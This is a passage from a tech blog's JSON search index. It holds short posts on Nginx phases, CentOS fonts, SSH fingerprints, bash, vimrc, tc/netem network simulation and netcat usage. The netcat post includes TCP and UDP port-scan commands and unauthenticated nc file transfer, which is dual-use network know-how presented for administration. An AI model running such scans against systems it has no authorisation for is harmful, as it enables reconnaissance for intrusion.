重写，并根据结果跳转到合适的阶段。\u003c/p\u003e\n\u003cp\u003e6）NGX_HTTP_PREACCESS_PHASE：\u003c/p\u003e\n\u003cp\u003e下一阶段之前的准备，访问权限控制的前一阶段，该阶段在权限控制阶段之前，一般也用于访问控制，比如限制访问频率，链接数等。\u003c/p\u003e\n\u003cp\u003e7）NGX_HTTP_ACCESS_PHASE：\u003c/p\u003e\n\u003cp\u003e让 HTTP 模块判断是否允许这个请求进入 Nginx 服务器，访问权限控制阶段，比如基于 ip 黑白名单的权限控制，基于用户名密码的权限控制等。\u003c/p\u003e\n\u003cp\u003e8）NGX_HTTP_POST_ACCESS_PHASE：\u003c/p\u003e\n\u003cp\u003e访问权限控制的后一阶段，该阶段根据权限控制阶段的执行结果进行相应处理，向用户发送拒绝服务的错误码，用来响应上一阶段的拒绝。\u003c/p\u003e\n\u003cp\u003e9）NGX_HTTP_TRY_FILES_PHASE：\u003c/p\u003e\n\u003cp\u003e为访问静态文件资源而设置，try_files 指令的处理阶段，如果没有配置 try_files 指令，则该阶段被跳过。\u003c/p\u003e\n\u003cp\u003e10）NGX_HTTP_CONTENT_PHASE：\u003c/p\u003e","tags":["URL","Nginx"],"title":"Nginx请求处理流程你了解吗？"},{"categories":["URL","Board Game"],"contents":" 阿瓦隆(The Resistance：Avalon) ","date":"December 24, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20181224-avalon/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mj9981168.pixnet.net/blog/posts/8196168065\" target=\"_blank\" rel=\"noopener\"\u003e阿瓦隆(The Resistance：Avalon)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Board Game"],"title":"阿瓦隆(The Resistance：Avalon)"},{"categories":["URL","Linux"],"contents":" Linux CentOS 7 安裝字體庫 \u0026amp; 中文本體 yum -y install fontconfig 這時在 /usr/shared 目錄就可以看到 fonts 和 fontconfig 目錄了（之前是沒有的）\n在這之前我們還需要新建目錄，首先在 /usr/shared/fonts 目錄下新建一個目錄 chinese\nmkdir /usr/shared/fonts/chinese\n只需要將我們需要的字體拷貝出來並上傳至 linux 服務器 /usr/shared/fonts/chinese 目錄下即可，在這裏我選擇宋體和黑體（報表中用到了這兩種字體），可以看到是兩個後綴名為 ttf 和 ttc 的文檔\nchmod -R 755 /usr/share/fonts/chinese\n接下來需要安裝 ttmkfdir 來搜索目錄中所有的字體信息，並彙總生成 fonts.scale 文檔\nyum -y install ttmkfdir ttmkfdir -e /usr/share/X11/fonts/encodings/encodings.dir vi /etc/fonts/fonts.conf \u0026lt;dir\u0026gt;/usr/shared/fonts/chinese\u0026lt;dir\u0026gt; 刷新內存中的字體緩存\nfc-cache\n","date":"December 18, 2018","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20181218-fonts/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://hk.saowen.com/a/8e1349c5e25aaca06614d56d65fcd43156684d591da80b5a886806ceac06e199\" target=\"_blank\" rel=\"noopener\"\u003eLinux CentOS 7 安裝字體庫 \u0026amp; 中文本體\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum -y install fontconfig\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e這時在 /usr/shared 目錄就可以看到 fonts 和 fontconfig 目錄了（之前是沒有的）\u003c/p\u003e\n\u003cp\u003e在這之前我們還需要新建目錄，首先在 /usr/shared/fonts 目錄下新建一個目錄 chinese\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emkdir /usr/shared/fonts/chinese\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e只需要將我們需要的字體拷貝出來並上傳至 linux 服務器 /usr/shared/fonts/chinese 目錄下即可，在這裏我選擇宋體和黑體（報表中用到了這兩種字體），可以看到是兩個後綴名為 ttf 和 ttc 的文檔\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003echmod -R 755 /usr/share/fonts/chinese\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e接下來需要安裝 ttmkfdir 來搜索目錄中所有的字體信息，並彙總生成 fonts.scale 文檔\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum -y install ttmkfdir\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ettmkfdir -e /usr/share/X11/fonts/encodings/encodings.dir\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evi /etc/fonts/fonts.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;dir\u0026gt;/usr/shared/fonts/chinese\u0026lt;dir\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e刷新內存中的字體緩存\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003efc-cache\u003c/code\u003e\u003c/p\u003e","tags":["URL","Linux"],"title":"Linux CentOS 7 安裝字體庫 \u0026 中文本體"},{"categories":["URL","Linux"],"contents":" What is the SHA256 that comes on the sshd entry in auth.log? ssh-keygen -lf .ssh/id_rsa.pub\ncat .ssh/id_rsa.pub | awk \u0026#39;{ print $2 }\u0026#39; | # Only the actual key data without prefix or comments base64 -d | # decode as base64 sha256sum | # SHA256 hash (returns hex) awk \u0026#39;{ print $1 }\u0026#39; | # only the hex data xxd -r -p | # hex to bytes base64 # encode as base64 ","date":"December 17, 2018","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20181217-what-is-the-sha256-that-comes-on-the-sshd-entry-in-auth-log/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://serverfault.com/questions/888281/what-is-the-sha256-that-comes-on-the-sshd-entry-in-auth-log\" target=\"_blank\" rel=\"noopener\"\u003eWhat is the SHA256 that comes on the sshd entry in auth.log?\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003essh-keygen -lf .ssh/id_rsa.pub\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat .ssh/id_rsa.pub    |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{ print $2 }\u0026#39;\u003c/span\u003e | \u003cspan style=\"color:#75715e\"\u003e# Only the actual key data without prefix or comments\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    base64 -d          | \u003cspan style=\"color:#75715e\"\u003e# decode as base64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sha256sum          | \u003cspan style=\"color:#75715e\"\u003e# SHA256 hash (returns hex)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{ print $1 }\u0026#39;\u003c/span\u003e | \u003cspan style=\"color:#75715e\"\u003e# only the hex data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    xxd -r -p          | \u003cspan style=\"color:#75715e\"\u003e# hex to bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    base64               \u003cspan style=\"color:#75715e\"\u003e# encode as base64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux"],"title":"What is the SHA256 that comes on the sshd entry in auth.log?"},{"categories":["URL","SHELL"],"contents":" What does \u0026lt; \u0026lt;(command args) mean in the shell? while IFS= read -r -d $\u0026#39;\\0\u0026#39; file; do dosomethingwith \u0026#34;$file\u0026#34; # do something with each file done \u0026lt; \u0026lt;(find /bar -name *foo* -print0) \u0026lt;() is called process substitution in the manual, and is similar to a pipe but passes an argument of the form /dev/fd/63 instead of using stdin.\n\u0026lt; reads the input from a file named on command line.\nTogether, these two operators function exactly like a pipe, so it could be rewritten as\nfind /bar -name *foo* -print0 | while read line; do ... done ","date":"November 17, 2018","hero":"/images/hero/shell.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20181117-what-does-command-args-mean-in-the-shell/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/questions/2443085/what-does-command-args-mean-in-the-shell\" target=\"_blank\" rel=\"noopener\"\u003eWhat does \u003ccode\u003e\u0026lt; \u0026lt;(command args)\u003c/code\u003e mean in the shell?\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e IFS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e read -r -d \u003cspan style=\"color:#e6db74\"\u003e$\u0026#39;\\0\u0026#39;\u003c/span\u003e file; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      dosomethingwith \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$file\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e        \u003cspan style=\"color:#75715e\"\u003e# do something with each file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e \u0026lt; \u0026lt;\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003efind /bar -name *foo* -print0\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003e\u0026lt;()\u003c/code\u003e is called \u003ca href=\"http://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html#Process-Substitution\" target=\"_blank\" rel=\"noopener\"\u003e\u003cstrong\u003eprocess substitution\u003c/strong\u003e\u003c/a\u003e in the manual, and is similar to a pipe but passes an argument of the form \u003ccode\u003e/dev/fd/63\u003c/code\u003e instead of using stdin.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;\u003c/code\u003e reads the input from a file named on command line.\u003c/p\u003e\n\u003cp\u003eTogether, these two operators function exactly like a pipe, so it could be rewritten as\u003c/p\u003e","tags":["URL","SHELL"],"title":"What does `\u003c \u003c(command args)` mean in the shell?"},{"categories":["URL","Linux","netcat"],"contents":" Netcat（Linux nc 指令）網路管理者工具實用範例 傳送測試用的 UDP 封包到遠端伺服器 下面這行指令會傳送 UDP 的測試封包到指定的機器與連接埠，-w1 參數是指定 timeout 的時間為 1 秒。\necho -n \u0026quot;foo\u0026quot; | nc -u -w1 192.168.1.8 5000\n開啟 UDP 連接埠接收資料 nc -lu localhost 5000\n遠端機器的連接埠掃描（Port Scanning） 這行指令會掃描指定機器 1 ~ 1000 與 2000 ~ 3000 這兩個範圍的 TCP 連接埠，看看哪些埠號有開啟。\nnc -vnz -w 1 192.168.233.208 1-1000 2000-3000\n這行則是掃描 UDP 的連接埠\nnc -vnzu 192.168.1.8 1-65535\n在兩台主機之間複製檔案 假設現在有兩台主機，分別為 A 主機與 B 主機，若要將一個檔案從 A 主機複製到 B 主機，可以先在 B 主機（檔案接收者）上執行：\nnc -l 5000 \u0026gt; my.jpg\n然後在 A 主機（檔案傳送者）上執行：\nnc hostB.com 5000 \u0026lt; my.jpg\n這樣就可以把 my.jpg 這個檔案從 A 主機複製到 B 主機上了。 雖然這個方式跟 scp 指令比起來可能不是最方便的，但是它的特點是不需要登入的動作（也就是說不需要任何帳號與密碼），假設你碰到兩台主機無法互相登入的時候，就可以使用這樣的方式處理。\n手動送出 HTTP 請求 echo -ne \u0026quot;GET / HTTP/1.0\\r\\n\\r\\n\u0026quot; | nc www.google.com 80\n透過代理伺服器（Proxy）連線 這指令會使用 10.2.3.4:8080 這個代理伺服器，連線至 host.example.com 的 42 連接埠。\nnc -x10.2.3.4:8080 -Xconnect host.example.com 42\n使用 Unix Domain Socket 這行指令會建立一個 Unix Domain Socket，並接收資料：\nnc -lU /var/tmp/dsocket\n","date":"November 9, 2018","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20181109-linux-utility-netcat-examples/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.gtwang.org/linux/linux-utility-netcat-examples/\" target=\"_blank\" rel=\"noopener\"\u003eNetcat（Linux nc 指令）網路管理者工具實用範例\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"傳送測試用的-udp-封包到遠端伺服器\"\u003e傳送測試用的 UDP 封包到遠端伺服器\u003c/h4\u003e\n\u003cp\u003e下面這行指令會傳送 UDP 的測試封包到指定的機器與連接埠，\u003ccode\u003e-w1\u003c/code\u003e 參數是指定 timeout 的時間為 1 秒。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eecho -n \u0026quot;foo\u0026quot; | nc -u -w1 192.168.1.8 5000\u003c/code\u003e\u003c/p\u003e\n\u003ch4 id=\"開啟-udp-連接埠接收資料\"\u003e開啟 UDP 連接埠接收資料\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003enc -lu localhost 5000\u003c/code\u003e\u003c/p\u003e\n\u003ch4 id=\"遠端機器的連接埠掃描port-scanning\"\u003e遠端機器的連接埠掃描（Port Scanning）\u003c/h4\u003e\n\u003cp\u003e這行指令會掃描指定機器 1 ~ 1000 與 2000 ~ 3000 這兩個範圍的 TCP 連接埠，看看哪些埠號有開啟。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003enc -vnz -w 1 192.168.233.208 1-1000 2000-3000\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e這行則是掃描 UDP 的連接埠\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003enc -vnzu 192.168.1.8 1-65535\u003c/code\u003e\u003c/p\u003e\n\u003ch4 id=\"在兩台主機之間複製檔案\"\u003e在兩台主機之間複製檔案\u003c/h4\u003e\n\u003cp\u003e假設現在有兩台主機，分別為 A 主機與 B 主機，若要將一個檔案從 A 主機複製到 B 主機，可以先在 B 主機（檔案接收者）上執行：\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003enc -l 5000 \u0026gt; my.jpg\u003c/code\u003e\u003c/p\u003e","tags":["URL","Linux","netcat"],"title":"Netcat（Linux nc 指令）網路管理者工具實用範例"},{"categories":["URL","Vim"],"contents":" vimrc 設定教學\n:set nu\n顯示行號：對於 debug 相當有幫助! :set ai\n自動對齊縮排：如果上一行有兩個 tab 的寬度，按 enter 繼續編輯下一行時會自動保留兩個 tab 鍵的寬度。 :set cursorline\n光標底線：光標所在的那一行會有底線，幫助尋找光標位置 :set bg=light\n上色模式-針對亮背景上色 預設為亮背景(白色等)上色，但是終端機的初始背景色為深紫色，會出現文字失蹤 ( 例如註解為深藍色 ) 的情況。將這一行換成 :set bg=dark 即可。 :set tabstop=4\n縮排間隔數 ( 預設為 8 個空白對齊 ) 也就是說按一次 tab 鍵，游標會自動跳 4 格空白字元的寬度。雖有多個空格但實際上只有一個 tab 字元。 注意：也就是說，在其他環境下，看到 tab 字元，依舊是 8 個空白寬 :set shiftwidth=4\n自動縮排對齊間隔數：向右或向左一個縮排的寬度 以下可以斟酌使用\n:set mouse=a 啟用游標選取：游標可以直接選取文字，滾輪可以直接滑動頁面 ( 非移動游標 )。 可以取代用 v 選取字元的功能，配合 ctrl+insert ( 複製 ) 及 shift+inset ( 貼上 )，相當方便 :set mouse=\u0026quot;\u0026quot; 停用游標選取：游標無法選取文字，滾輪只會移動光標的位置。 :set ruler ( 預設就有 ) 顯示右下角的 行,列 目前在文件的位置 % 的資訊 :set backspace=2 ( 預設就有 ) 在 insert 模式啟用 backspace 鍵 :set formatoptions+=r 自動註解(注意：若要貼上的文件某一行有註解，會因為此項設定而讓其以下每一行都變成註解) :set history=100 保留 100 個使用過的指令 :set incsearch 在關鍵字尚未完全輸入完畢前就顯示結果 如果覺得這功能太過熱心的話，可以使用 ctrl+n 來達成自動補完的功能 ","date":"November 3, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20181103-vimrc/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://wiki.csie.ncku.edu.tw/vim/vimrc\" target=\"_blank\" rel=\"noopener\"\u003evimrc 設定教學\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e:set nu\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e顯示行號：對於 debug 相當有幫助!\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e:set ai\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e自動對齊縮排：如果上一行有兩個 tab 的寬度，按 enter 繼續編輯下一行時會自動保留兩個 tab 鍵的寬度。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e:set cursorline\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e光標底線：光標所在的那一行會有底線，幫助尋找光標位置\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e:set bg=light\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e上色模式-針對亮背景上色\u003c/li\u003e\n\u003cli\u003e預設為亮背景(白色等)上色，但是終端機的初始背景色為深紫色，會出現文字失蹤 ( 例如註解為深藍色 ) 的情況。將這一行換成 :set bg=dark 即可。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e:set tabstop=4\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e縮排間隔數 ( 預設為 8 個空白對齊 )\u003c/li\u003e\n\u003cli\u003e也就是說按一次 tab 鍵，游標會自動跳 4 格空白字元的寬度。雖有多個空格但實際上只有一個 tab 字元。\u003c/li\u003e\n\u003cli\u003e注意：也就是說，在其他環境下，看到 tab 字元，依舊是 8 個空白寬\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e:set shiftwidth=4\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e自動縮排對齊間隔數：向右或向左一個縮排的寬度\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e以下可以斟酌使用\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e:set mouse=a\n\u003cul\u003e\n\u003cli\u003e啟用游標選取：游標可以直接選取文字，滾輪可以直接滑動頁面 ( 非移動游標 )。\u003c/li\u003e\n\u003cli\u003e可以取代用 v 選取字元的功能，配合 ctrl+insert ( 複製 ) 及 shift+inset ( 貼上 )，相當方便\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e:set mouse=\u0026quot;\u0026quot;\n\u003cul\u003e\n\u003cli\u003e停用游標選取：游標無法選取文字，滾輪只會移動光標的位置。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e:set ruler\n\u003cul\u003e\n\u003cli\u003e( 預設就有 ) 顯示右下角的 行,列 目前在文件的位置 % 的資訊\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e:set backspace=2\n\u003cul\u003e\n\u003cli\u003e( 預設就有 ) 在 insert 模式啟用 backspace 鍵\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e:set formatoptions+=r\n\u003cul\u003e\n\u003cli\u003e自動註解(注意：若要貼上的文件某一行有註解，會因為此項設定而讓其以下每一行都變成註解)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e:set history=100\n\u003cul\u003e\n\u003cli\u003e保留 100 個使用過的指令\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e:set incsearch\n\u003cul\u003e\n\u003cli\u003e在關鍵字尚未完全輸入完畢前就顯示結果\u003c/li\u003e\n\u003cli\u003e如果覺得這功能太過熱心的話，可以使用 ctrl+n 來達成自動補完的功能\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Vim"],"title":"vimrc設定教學"},{"categories":["URL","Browser","UserAgent"],"contents":" 為什麼瀏覽器 user-agent string 總是包含 Mozilla/5.0 ? What does \u0026ldquo;Mozilla/5.0\u0026rdquo; in user agent string signify? History of the browser user-agent string 快速結論\n因為網站開發者可能會因為你是某瀏覽器(這裡是 Mozilla)，所以輸出一些特殊功能的程式碼(這裡指好的特殊功能)，所以當其他瀏覽器也支援這種好功能時，就試圖去模仿 Mozilla 瀏覽器讓網站輸出跟 Mozilla 一樣的內容，而不是輸出被閹割功能的程式碼。\n","date":"October 17, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20181017-mozilla5-0-always-user-agent-string/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://yulun.me/2013/mozilla5-0-always-user-agent-string/\" target=\"_blank\" rel=\"noopener\"\u003e為什麼瀏覽器 user-agent string 總是包含 Mozilla/5.0 ?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://stackoverflow.com/questions/12288452/what-does-mozilla-5-0-in-user-agent-string-signify\" target=\"_blank\" rel=\"noopener\"\u003eWhat does \u0026ldquo;Mozilla/5.0\u0026rdquo; in user agent string signify?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://webaim.org/blog/user-agent-string-history/\" target=\"_blank\" rel=\"noopener\"\u003eHistory of the browser user-agent string\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e快速結論\u003c/p\u003e\n\u003cp\u003e因為網站開發者可能會因為你是某瀏覽器(這裡是 Mozilla)，所以輸出一些特殊功能的程式碼(這裡指好的特殊功能)，所以當其他瀏覽器也支援這種好功能時，就試圖去模仿 Mozilla 瀏覽器讓網站輸出跟 Mozilla 一樣的內容，而不是輸出被閹割功能的程式碼。\u003c/p\u003e","tags":["URL","Browser","UserAgent"],"title":"為什麼瀏覽器 user-agent string 總是包含 Mozilla/5.0 ?"},{"categories":["URL","Linux","Network"],"contents":" 使用 TC 和 Netem 模拟网络异常 Netem 与 TC 简要说明\nNetem 是 Linux 2.6 及以上内核版本提供的一个网络模拟功能模块。该功能模块可以用来在性能良好的局域网中，模拟出复杂的互联网传输性能。例如:低带宽、传输延迟、丢包等等情况。使用 Linux 2.6 (或以上) 版本内核的很多 Linux 发行版都默认开启了该内核模块，比如：Fedora、Ubuntu、Redhat、OpenSuse、CentOS、Debian 等等。\nTC 是 Linux 系统中的一个用户态工具，全名为 Traffic Control (流量控制)。TC 可以用来控制 Netem 模块的工作模式，也就是说如果想使用 Netem 需要至少两个条件，一是内核中的 Netem 模块被启用，另一个是要有对应的用户态工具 TC 。\n所有的报文延迟 100ms 发送: $ tc qdisc add dev enp0s5 root netem delay 100ms 模拟丢包率: $ tc qdisc change dev enp0s5 root netem loss 50% 模拟包重复: $ tc qdisc change dev enp0s5 root netem duplicate 50% 模拟包损坏: tc qdisc change dev enp0s5 root netem corrupt 2% 模拟包乱序(每 5 个报文（第 5、10、15…报文）会正常发送，其他的报文延迟 100ms): tc qdisc change dev enp0s5 root netem reorder 50% gap 3 delay 100ms 查看并显示 enp0s5 网卡的相关传输配置 $ tc qdisc show dev enp0s5\nWondershaper 设置网卡下载速度为 200kb/s，上传速度为 150kb/s\n$ sudo wondershaper enp0s5 200 150\n速率限制消除\n$ sudo wondershaper clear enp0s5\nComcast $ comcast --device=enp0s5 --latency=250 \\ --target-bw=1000 \\ --default-bw=1000000 \\ --packet-loss=10% \\ --target-addr=8.8.8.8,10.0.0.0/24 \\ --target-proto=tcp,udp,icmp \\ --target-port=80,22,1000:2000 --device 说明要控制的网卡为 enp0s5。 --latency 指定 250ms 的延迟。 --target-bw 指定目标带宽。 --default-bw 指定默认带宽。 --packet-loss 指定丢包率。 --target-addr/--target-proto/--target-port 参数指定在满足这些条件的报文上实施上面的配置。 ","date":"September 15, 2018","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180915-simulate-network-anomalies-using-tc-and-netem/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.hi-linux.com/posts/35699.html\" target=\"_blank\" rel=\"noopener\"\u003e使用 TC 和 Netem 模拟网络异常\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNetem 与 TC 简要说明\u003c/p\u003e\n\u003cp\u003eNetem 是 Linux 2.6 及以上内核版本提供的一个网络模拟功能模块。该功能模块可以用来在性能良好的局域网中，模拟出复杂的互联网传输性能。例如:低带宽、传输延迟、丢包等等情况。使用 Linux 2.6 (或以上) 版本内核的很多 Linux 发行版都默认开启了该内核模块，比如：Fedora、Ubuntu、Redhat、OpenSuse、CentOS、Debian 等等。\u003c/p\u003e\n\u003cp\u003eTC 是 Linux 系统中的一个用户态工具，全名为 Traffic Control (流量控制)。TC 可以用来控制 Netem 模块的工作模式，也就是说如果想使用 Netem 需要至少两个条件，一是内核中的 Netem 模块被启用，另一个是要有对应的用户态工具 TC 。\u003c/p\u003e\u003c/blockquote\u003e\n\u003col\u003e\n\u003cli\u003e所有的报文延迟 100ms 发送: \u003ccode\u003e$ tc qdisc add dev enp0s5 root netem delay 100ms\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e模拟丢包率: \u003ccode\u003e$ tc qdisc change dev enp0s5 root netem loss 50%\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e模拟包重复: \u003ccode\u003e$ tc qdisc change dev enp0s5 root netem duplicate 50%\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e模拟包损坏: \u003ccode\u003etc qdisc change dev enp0s5 root netem corrupt 2%\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e模拟包乱序(每 5 个报文（第 5、10、15…报文）会正常发送，其他的报文延迟 100ms): \u003ccode\u003etc qdisc change dev enp0s5 root netem reorder 50% gap 3 delay 100ms\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 id=\"查看并显示-enp0s5-网卡的相关传输配置\"\u003e查看并显示 enp0s5 网卡的相关传输配置\u003c/h5\u003e\n\u003cp\u003e\u003ccode\u003e$ tc qdisc show dev enp0s5\u003c/code\u003e\u003c/p\u003e","tags":["URL","Linux","Network"],"title":"使用 TC 和 Netem 模拟网络异常"},{"categories":["URL","Linux","Network"],"contents":" Quagga Routing - Install, Configure and setup BGP ","date":"August 14, 2018","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180814-quagga-routing--install-configure-and-setup-bgp/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.psychz.net/client/kb/en/quagga-routing--install-configure-and-setup-bgp.html\" target=\"_blank\" rel=\"noopener\"\u003eQuagga Routing - Install, Configure and setup BGP\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Linux","Network"],"title":"Quagga Routing - Install, Configure and setup BGP"},{"categories":["URL","Linux"],"contents":" Systemd 入门教程：实战篇 $ systemctl cat sshd.service [Unit] Description=OpenSSH server daemon Documentation=man:sshd(8) man:sshd_config(5) After=network.target sshd-keygen.service 